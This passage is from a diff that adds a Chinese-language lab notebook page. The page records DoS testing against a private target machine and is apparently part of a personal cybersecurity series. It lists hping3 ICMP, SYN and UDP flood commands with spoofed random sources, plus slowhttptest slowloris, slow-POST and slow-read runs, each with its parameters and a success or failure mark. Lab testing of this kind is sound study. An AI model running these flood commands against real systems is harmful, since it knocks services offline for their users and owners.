+          <td>hping3 &ndash;icmp &ndash;flood -d 1000 172.31.132.2</td>
+      </tr>
+      <tr>
+          <td>防火墙关闭，NAT模式，随机源ICMP❌</td>
+          <td>12:27</td>
+          <td>12:28</td>
+          <td>hping3 &ndash;icmp &ndash;flood &ndash;rand-source -d 1000 172.31.132.2</td>
+      </tr>
+      <tr>
+          <td>防火墙关闭，桥接模式，单ip ICMP✅</td>
+          <td>12:32</td>
+          <td>12:33</td>
+          <td>hping3 &ndash;icmp &ndash;flood -d 1000 172.31.132.2</td>
+      </tr>
+      <tr>
+          <td>防火墙关闭，桥接模式，随机源ICMP✅</td>
+          <td>12:35</td>
+          <td>12:36</td>
+          <td>hping3 &ndash;icmp &ndash;flood &ndash;rand-source -d 1000 172.31.132.2</td>
+      </tr>
+  </tbody>
+</table>
+<table>
+  <thead>
+      <tr>
+          <th>攻击类型</th>
+          <th>开始（1min结束）</th>
+          <th>命令</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>防火墙关闭，桥接模式，SYN Flood，6线程</td>
+          <td></td>
+          <td>sudo hping3 -S &ndash;flood &ndash;rand-source -d 0 -p 8080 172.31.132.2</td>
+      </tr>
+      <tr>
+          <td>防火墙关闭，桥接模式，UDP Flood，6线程</td>
+          <td></td>
+          <td>sudo hping3 &ndash;udp &ndash;flood &ndash;rand-source -d 0 -p 8080 172.31.132.2</td>
+      </tr>
+      <tr>
+          <td>防火墙关闭，桥接模式，UDP Flood，6线程</td>
+          <td></td>
+          <td>sudo hping3 &ndash;icmp &ndash;flood &ndash;rand-source -d 56 172.31.132.2</td>
+      </tr>
+      <tr>
+          <td>防火墙关闭，桥接模式，ICMP Flood（超大ICMP），6线程</td>
+          <td></td>
+          <td>sudo hping3 &ndash;icmp &ndash;flood &ndash;rand-source -d 1000 172.31.132.2</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="二慢dos桥接防火墙关闭失败">二、慢dos（桥接+防火墙关闭）（失败）<a class="anchor" href="#%e4%ba%8c%e6%85%a2dos%e6%a1%a5%e6%8e%a5%e9%98%b2%e7%81%ab%e5%a2%99%e5%85%b3%e9%97%ad%e5%a4%b1%e8%b4%a5">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span><span style="color:#78787e"># 三种慢dos：slowloris模式（耗尽连接池）、slow post模式（耗尽写缓冲区）、slow read模式（耗尽读缓冲区）</span>
+</span></span><span style="display:flex;"><span>slowhttptest -c <span style="color:#ff9f43">1000</span> -H -g -o slowloris_stats -i <span style="color:#ff9f43">10</span> -r <span style="color:#ff9f43">200</span> -t GET -u http://172.31.132.2:8080/
+</span></span><span style="display:flex;"><span>slowhttptest -c <span style="color:#ff9f43">1000</span> -B -g -o slow_post_stats -i <span style="color:#ff9f43">110</span> -r <span style="color:#ff9f43">200</span> -s <span style="color:#ff9f43">8192</span> -t POST -u http://172.31.132.2:8080/
+</span></span><span style="display:flex;"><span>slowhttptest -c <span style="color:#ff9f43">1000</span> -X -r <span style="color:#ff9f43">200</span> -w <span style="color:#ff9f43">512</span> -y <span style="color:#ff9f43">1024</span> -n <span style="color:#ff9f43">5</span> -z <span style="color:#ff9f43">32</span> -u http://172.31.132.2:8080/</span></span></code></pre></div><ul>
+<li><code>-H</code>开启slowloris模式（发送不完整的Header）</li>
+<li><code>-c 1000</code>建立1000个连接</li>
+<li><code>-i 10</code>发送后续数据的间隔时间（秒）</li>
+<li><code>-r 200</code>每秒建立200个连接</li>
+<li><code>-B</code>开启slow body模式</li>
+<li><code>-s 8192</code>声明content-length为8192字节</li>
+<li><code>-X</code>开启slow read模式</li>
+<li><code>-w 512 -y 1024</code>限制接收窗口大小</li>
+</ul>
+<table>
+  <thead>
+      <tr>
+          <th>攻击类型</th>
+          <th>开始（1min结束）</th>
+          <th>命令</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>慢dos（连接强度：高频）❌</td>
+          <td>16:11</td>
+          <td>slowhttptest -c 1000 -H -g -o stats_fast -i 10 -r 500 -t GET -u http://172.31.132.2:8080/</td>
+      </tr>
+      <tr>
+          <td>慢dos（连接强度：低频）❌</td>
+          <td>16:13</td>
+          <td>slowhttptest -c 1000 -H -g -o stats_slow_rate -i 10 -r 10 -t GET -u http://172.31.132.2:8080/</td>
+      </tr>
+      <tr>
+          <td>慢dos（发送间隔：长）❌</td>
+          <td>16:15</td>
+          <td>slowhttptest -c 1000 -H -g -o stats_long_interval -i 30 -r 200 -t GET -u http://172.31.132.2:8080/</td>
+      </tr>
+      <tr>
+          <td>慢dos（发送间隔：短）❌</td>
+          <td>16:17</td>
+          <td>slowhttptest -c 1000 -H -g -o stats_short_interval -i 3 -r 200 -t GET -u http://172.31.132.2:8080/</td>
+      </tr>
+      <tr>
+          <td>慢dos（慢速POST攻击）❌</td>
+          <td>16:19</td>
+          <td>slowhttptest -c 1000 -B -g -o stats_slow_post -i 20 -r 200 -s 8192 -t POST -u http://172.31.132.2:8080/</td>
+      </tr>
+  </tbody>
+</table>
+<h1 id="414慢速ddos">4.14慢速Ddos<a class="anchor" href="#414%e6%85%a2%e9%80%9fddos">#</a></h1>
+<table>
+  <thead>
+      <tr>
+          <th>慢ddos攻击类型</th>
+          <th>时间段</th>
+          <th>命令</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>低并发❌</td>
+          <td>9:26~9:28</td>
+          <td>slowhttptest -c 500 -H -i 10 -r 200 -t GET -u http://172.31.132.2:8080/</td>
+      </tr>
+      <tr>
+          <td>中并发❌</td>
+          <td>9:30~9:33</td>
+          <td>slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://172.31.132.2:8080/</td>
+      </tr>
+      <tr>
+          <td>高并发（测试吞吐极限）✅（但被L4传输层检测为syn攻击）</td>
+          <td>9:35~9:39</td>
+          <td>slowhttptest -c 5000 -H -i 10 -r 200 -t GET -u http://172.31.132.2:8080/</td>
+      </tr>
+      <tr>
+          <td>低连接速率❌</td>
+          <td>9:45~9:48</td>
+          <td>slowhttptest -c 1000 -H -i 10 -r 10 -u http://172.31.132.2:8080/</td>
+      </tr>
+      <tr>
+          <td>高连接速率❌</td>
+          <td>9:51~9:54</td>
+          <td>slowhttptest -c 1000 -H -i 10 -r 1000 -u http://172.31.132.2:8080/</td>
+      </tr>
+      <tr>
+          <td>超高连接速率（强制触发防御）❌</td>
+          <td>10:00~10:03</td>
+          <td>slowhttptest -c 1000 -H -i 10 -r 2000 -u http://172.31.132.2:8080/</td>
+      </tr>
+      <tr>
+          <td>高频发送数据速率❌</td>
+          <td>10:05~10：08</td>
+          <td>slowhttptest -c 1000 -H -i 5 -r 200 -t GET -u http://172.31.132.2:8080/</td>
+      </tr>
+      <tr>
+          <td>极限型发送数据速率❌</td>
+          <td>10:10~10:13</td>
+          <td>slowhttptest -c 1000 -H -i 60 -r 200 -t GET -u http://172.31.132.2:8080/</td>
+      </tr>
+  </tbody>
+</table>
+<table>
+  <thead>
+      <tr>
+          <th>慢ddos攻击类型</th>
+          <th>时间段</th>
+          <th>命令</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>slowloris攻击（稳健）</td>
+          <td>13:52~13:56</td>
+          <td>slowhttptest -c 2000 -H -i 15 -r 50 -t GET -u http://172.31.132.2:8080/</td>
+      </tr>
+      <tr>
+          <td>slowloris攻击（短发送间隔）</td>
+          <td>14:02~14:06</td>
+          <td>slowhttptest -c 2000 -H -i 5 -r 50 -t GET -u http://172.31.132.2:8080/</td>
+      </tr>
+      <tr>
+          <td>slowloris攻击（高压）</td>
+          <td>14:08~14:13</td>
+          <td>slowhttptest -c 4000 -H -i 30 -r 80 -t GET -u http://172.31.132.2:8080/</td>
+      </tr>
+      <tr>
+          <td>slow post攻击（标准）</td>
+          <td>14:14~14:17</td>
+          <td>slowhttptest -c 1500 -B -i 10 -r 40 -s 4096 -t POST -u http://172.31.132.2:8080/</td>
+      </tr>
+      <tr>
+          <td>slow post攻击（极慢）</td>
+          <td>14:20~14:22</td>
+          <td>slowhttptest -c 2500 -B -i 20 -r 60 -x 5 -s 8192 -t POST -u http://172.31.132.2:8080/</td>
+      </tr>
+      <tr>
+          <td>slow read攻击（窗口限制）</td>
+          <td>14:23~14:28</td>
+          <td>slowhttptest -c 1000 -X -r 30 -w 1 -y 2 -n 5 -u http://172.31.132.2:8080/</td>
+      </tr>
+      <tr>
+          <td>slow read攻击（吞吐抑制）</td>
+          <td>14:30~14:35</td>
+          <td>slowhttptest -c 2000 -X -r 50 -w 5 -z 10 -n 10 -u http://172.31.132.2:8080/</td>
+      </tr>
+  </tbody>
+</table>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+<div>
+
+</div>
+
+<div>
+
+</div>
+
+</div>
+
+
+
+
+
+  
+  
+  
+  <div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/cybersecurity/xnwlaqbc%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/xnwlaqbc%E9%9D%B6%E6%9C%BA%E9%83%A8%E7%BD%B2%E4%B8%8E%E6%94%BB%E5%87%BB/" class="flex align-center">
+        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>xnwlaqbc靶机部署与攻击</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/cybersecurity/DVWA/" class="flex align-center">
+        <span>DVWA</span>
+        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
+  
+
+
+ 
+        
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+        
+        
+  
+  <div class="book-copyright flex justify-center">
+    <small>vnccer - <a href="https://creativecommons.org/licenses/by/4.0/legalcode">© CC BY 4.0</a></small>
+  </div>
+  
+ 
+        
+  
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#20260403-ddos攻击测试记录">2026.04.03 DDos攻击测试记录</a>
+      <ul>
+        <li><a href="#一icmp-ddos攻击">一、ICMP DDos攻击</a></li>
+        <li><a href="#二udp-ddos攻击">二、UDP DDos攻击</a></li>
+        <li><a href="#三tcp-syn-ddos攻击">三、TCP Syn DDos攻击</a></li>
+        <li><a href="#四思路调试">四、思路调试</a></li>
+      </ul>
+    </li>
+    <li><a href="#410思路">4.10思路</a></li>
+    <li><a href="#单ip攻击">单ip攻击</a></li>
+    <li><a href="#随机源ip攻击">随机源ip攻击</a></li>
+    <li><a href="#udp组攻击一三组-d速度统一u100-">UDP组攻击一：三组-d，速度统一，u100 =</a></li>
+    <li><a href="#udp组攻击二极限速度">UDP组攻击二：极限速度</a></li>
+    <li><a href="#udp组攻击三单ip攻击">UDP组攻击三：单IP攻击</a>
+      <ul>
+        <li><a href="#二慢dos桥接防火墙关闭失败">二、慢dos（桥接+防火墙关闭）（失败）</a></li>
+      </ul>
+    </li>
+    <li><a href="#414慢速ddos">4.14慢速Ddos</a></li>
+  </ul>
+</nav>
+
+
+
+    </div>
+  </aside>
+  
+ 
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
